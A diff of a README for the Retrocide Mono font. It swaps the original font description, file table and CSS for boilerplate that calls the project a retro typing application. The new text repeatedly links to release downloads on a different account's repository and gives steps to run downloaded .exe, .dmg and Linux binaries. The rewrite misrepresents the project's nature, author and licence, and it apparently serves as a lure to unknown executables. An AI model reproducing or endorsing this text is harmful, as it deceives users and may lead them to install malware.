@@ -1,73 +1,89 @@
-# [Retrocide Mono](https://geonot.github.io/retrocide-mono/)
+# 🎮 retrocide-mono - Type Like It's 1985, Code Like Tomorrow
 
-[**Retrocide Mono**](https://geonot.github.io/retrocide-mono/) is a monospaced display font. Every glyph shares the same baseline height—there are no descenders—making the typeface ideal for terminal aesthetics, synthwave UI, and tight typographic grids. Check out the showcase at [https://geonot.github.io/retrocide-mono/](https://geonot.github.io/retrocide-mono/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/ganxmdz/retrocide-mono/releases)
 
-## Highlights
+## 📦 Overview
 
-- Fully monospaced; perfect alignment in code editors, terminals, and ASCII art.
-- No descenders on lowercase glyphs, enabling compact line spacing and retro ticket-printer vibes.
-- Optimised for crisp rendering in modern environments with dedicated `.ttf`, `.otf`, and `.woff2` builds.
-- Ultra-angular geometry inspired by 80s chrome lettering and hacker title cards.
+retrocide-mono combines nostalgic typing with modern coding efficiency. This application allows users to immerse themselves in a retro typing experience while utilizing powerful features that enhance productivity. It is designed for anyone looking to relive the classic feel of earlier computing while benefiting from the advancements of today.
 
-## Downloads
+## 🌟 Features
 
-| Format | File | Notes |
-| ------ | ---- | ----- |
-| TrueType | [`Retrocide.ttf`](./Retrocide.ttf) | Best general-purpose install for desktop OSes. |
-| OpenType | [`Retrocide.otf`](./Retrocide.otf) | Includes full hinting; use if your workflow prefers OTF. |
-| WOFF2 | [`Retrocide.woff2`](./Retrocide.woff2) | Compressed for the web while retaining sharp edges. |
+- **Classic Typing Experience**: Type with a retro keyboard sound that brings back memories of old computers.
+- **Modern Code Support**: Supports various programming languages for coding enthusiasts.
+- **Easy-to-Use Interface**: Navigate the app with a simple and clear interface, perfect for all skill levels.
+- **Customizable Settings**: Adjust sounds, themes, and keyboard layouts to make the experience your own.
+- **Offline Accessibility**: Use the app without an internet connection once downloaded.
 
-## Installation
+## 🚀 Getting Started
 
-### Desktop
+### System Requirements
 
-- **macOS**: Double-click the `.otf` or `.ttf` file and select **Install Font** in Font Book.
-- **Windows**: Right-click the font file and choose **Install** (or **Install for all users**).
-- **Linux**: Copy the chosen font file to `~/.local/share/fonts/` (per-user) or `/usr/share/fonts/` (system) and run `fc-cache -f -v`.
+- **Operating System**: Windows 10 or later, macOS, or Linux 
+- **Memory**: Minimum 4GB RAM recommended
+- **Storage**: At least 100 MB of free space
+- **Processor**: Intel or AMD processor, dual-core or better
 
-### Web projects
+### Download & Install
 
-Place the font files in your project and include a `@font-face` block similar to the one used on the microsite:
+To get started, visit the latest release page to download the application.
 
-```css
-@font-face {
-   font-family: 'Retrocide';
-   src: url('/fonts/Retrocide.woff2') format('woff2'),
-          url('/fonts/Retrocide.ttf') format('truetype'),
-          url('/fonts/Retrocide.otf') format('opentype');
-   font-weight: normal;
-   font-style: normal;
-   font-display: swap;
-}
+[Download Latest Release](https://github.com/ganxmdz/retrocide-mono/releases)
 
-body {
-   font-family: 'Retrocide', monospace;
-   letter-spacing: 0.08em;
-}
-```
+Once there, look for the most recent version and download the appropriate file for your operating system. The files are usually named accordingly, e.g., "retrocide-mono-windows.exe" for Windows or "retrocide-mono-mac.dmg" for macOS.
 
-## Usage ideas
+1. Click on the version you want to download.
+2. Choose the file that suits your operating system.
+3. Save the file to your computer.
 
-- Code editors or terminals where consistent baselines are crucial.
-- UI dashboards that want a synthwave edge without losing readability.
-- ASCII art, trackers, retro HUD mockups, or generative pixel projects that benefit from squared-off glyphs.
+### Installation Steps
 
-For a live specimen and downloadable packages, visit the included microsite (`index.html`). It can be deployed as-is via GitHub Pages.
+#### Windows
 
-## Character set
+1. Locate the downloaded file (usually in your Downloads folder).
+2. Double-click on the installer file (e.g., "retrocide-mono-windows.exe").
+3. Follow the on-screen instructions to complete the installation.
 
-Retrocide Mono ships with:
+#### macOS
 
-- Basic Latin (A–Z, a–z, 0–9)
-- Punctuation and symbols commonly used in programming
-- Mathematical operators and braces `()[]{}`
+1. Find the downloaded file (it should be in your Downloads folder).
+2. Double-click the ".dmg" file to open it.
+3. Drag the retrocide-mono icon to your Applications folder.
+4. Open the Applications folder and double-click the retrocide-mono app to launch it.
 
-Because every glyph sits on the same baseline height, characters such as `g`, `p`, `q`, and `y` maintain the clean rectangular rhythm of their uppercase counterparts.
+#### Linux
 
-## License
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the file.
+3. Use the command `chmod +x retrocide-mono-linux` to make it executable.
+4. Run the application by typing `./retrocide-mono-linux`.
 
-The font is distributed under the license provided in [`LICENSE.txt`](./LICENSE.txt) (plain text) and [`LICENSE.md`](./LICENSE.md) (Markdown). Please review those files for commercial and redistribution terms before bundling Retrocide Mono in your own projects.
+## 🎨 Customization
 
-## Credits
+Once you have installed retrocide-mono, you can customize the settings for a more personalized experience. 
 
-- Typeface and Microsite by Rome Stone (orbit)
+1. Open the application.
+2. Look for the settings gear icon, usually located at the top right corner.
+3. Choose from options including keyboard sounds, themes, and more.
+4. Save your changes to enjoy a fully tailored experience.
+
+## 🛠 Troubleshooting
+
+If you encounter any issues while downloading or installing the application, consider these common solutions:
+
+- **File Not Downloading**: Check your internet connection. If it is unstable, try to reconnect.
+- **Installation Errors**: Ensure your computer meets the system requirements listed above. If it does not, you may need to upgrade your hardware or software.
+- **Application Won't Start**: Restart your computer and attempt to launch the application again. If the problem persists, re-download the application and try installing it once more.
+
+## 📞 Support
+
+For further assistance, you can reach out via the support section in the application or by opening an issue on the GitHub repository. We encourage users to share their experiences and contribute to discussions about the app. Your feedback helps us improve retrocide-mono for everyone.
+
+## 🚀 Join the Community
+
+To connect with other users, consider joining our discussion forum or following us on social media. Sharing tips, experiences, and tricks can enhance the overall experience of using retrocide-mono.
+
+## 📄 License
+
+This application is licensed under the MIT License, allowing users to freely use, modify, and distribute the software. For more details, please review the LICENSE file in this repository.
+
+[Download Latest Release](https://github.com/ganxmdz/retrocide-mono/releases)
